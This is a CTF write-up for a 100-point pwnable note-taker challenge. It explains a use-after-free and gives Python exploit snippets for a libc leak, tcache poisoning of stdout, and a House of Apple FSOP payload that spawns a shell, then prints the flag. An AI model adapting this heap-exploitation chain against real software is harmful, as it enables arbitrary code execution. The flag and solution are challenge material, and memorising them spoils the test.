# 67

## 1. Summary

- **Category**: Pwnable
- **Points**: 100
- **Solves**: 154

### Description

> `"A simple note taker"`

## 2. Analysis

### Checksec

```text
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

### Vulnerability

- **Use After Free (UAF)**: This appears to be a typical heap-related challenge. Looking at the `Notes` function, it allows for up to 10 chunks (indices 0-9) with sizes ranging from 1 to 0x400.

```c
  if ((iVar2 < 0) || (9 < iVar2)) {
    puts("Invalid index");
  }
  else {
    printf("Size: ");
    iVar3 = get_int();
    if ((iVar3 < 1) || (0x400 < iVar3)) {
      puts("Invalid size");
    }
    else {
      pcVar4 = malloc(iVar3);
      notes[iVar2] = pcVar4;
      sizes[iVar2] = iVar3;
      printf("Data: ");
      read(0,notes[iVar2],iVar3);
      puts("Note created!");
    }
  }
```

- **Persistence of Pointers**: Crucially, when a note is deleted, the pointer in the `notes` array is not cleared after the `free` call.

```c
    free(notes[iVar2]);
    puts("Note deleted!");
```

Because the pointers remain, we can still call `read_note` or `edit_note` on freed indices, enabling a Use After Free (UAF) attack.

## 3. Exploit Flow

1. **Information Leak**
   We take advantage of the ability to create 10 notes to fill the Tcache and place a chunk into the **Unsorted Bin** to leak the `main_arena` address.

```python
    [create_note(r, i, 0x100, b"A") for i in range(8)]
    [delete_note(r, i) for i in range(8, -1, -1)]
    read_note(r, 0)
    r.recvuntil(b"Data: ")
    main_arena = u64(r.recv(8))
    libc.address = main_arena - MAIN_ARENA_OFFSET

    read_note(r, 7)
    r.recvuntil(b"Data: ")
    mangler = u64(r.recv(8))
```

After leaking the `main_arena` to find the Libc base, we also leak the Tcache "mangler" key (pointer protection) to prepare for poisoning. Since the binary has Full RELRO, a GOT overwrite is impossible, so we target **FSOP (File Stream Oriented Programming)**.

1. **Tcache Poisoning**
   We target `_IO_2_1_stdout_` by overwriting the `fd` of the most recently freed Tcache chunk (index 1).

```python
    target = mangler ^ libc.sym._IO_2_1_stdout_
    edit_note(r, 1, p64(target))
    create_note(r, 0, 0x100, b"A")
```

This forces the Tcache to return the address of `_IO_2_1_stdout_` on the next allocation of the same size.

1. **House of Apple Attack**
   The core strategy is to use the **House of Apple** technique. Unlike the standard `vtable`, the boundary check for `_wide_data->_wide_vtable` is non-existent. By redirecting the `vtable` to `_IO_wfile_jumps - 0x20`, output functions like `puts` will eventually call `_IO_wfile_overflow`.

   Tracing the execution leads to `_IO_wdoallocbuf`, which triggers `_IO_WDOALLOCATE(FP)`, effectively calling `__doallocate(0x68)`. By overwriting the `_wide_vtable` address with `system - 0x68`, we can force the program to execute `system` instead.

2. **Condition Setup**
   To reach the vulnerable code path in `_IO_wdoallocbuf`, several conditions must be met:
   1. `(f->_wide_data->_IO_write_end - f->_wide_data->_IO_write_ptr) == 0`
   2. `(f->_flags & _IO_CURRENTLY_PUTTING) == 0`
   3. `f->_wide_data->_IO_write_base == 0`
   4. `(fp->_flags & _IO_UNBUFFERED) == 0`
   5. `fp->_wide_data->_IO_buf_base == 0`

   If `fp->_flags` is set to `"sh"` (0x6873), conditions 2 and 4 would fail. Thus, I used `" sh"` (0x687320) with a leading space to satisfy the requirements without breaking the command.

3. **Payload Construction**
   I chose `_IO_save_end` (offset `0x58`) to hold the `system` address. To align with the `0x68` offset required for `__doallocate`, I subtracted `0x10`.

```python
    fs = FileStructure()
    fs.flags = u32(" sh\0")
    fs._lock = libc.address + 0x1E9790
    fs.vtable = libc.sym._IO_wfile_jumps - 0x20
    fs._wide_data = libc.sym._IO_2_1_stdout_
    fs._IO_save_end = libc.sym.system
    create_note(r, 0, 0x100, bytes(fs) + p64(libc.sym._IO_2_1_stdout_ - 0x10))
```

Sending this payload triggers `system(" sh")` on the next `puts` call.

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

## 5. Flag

`0xfun{p4cm4n_Syu_br0k3_my_xpl0it_btW}`
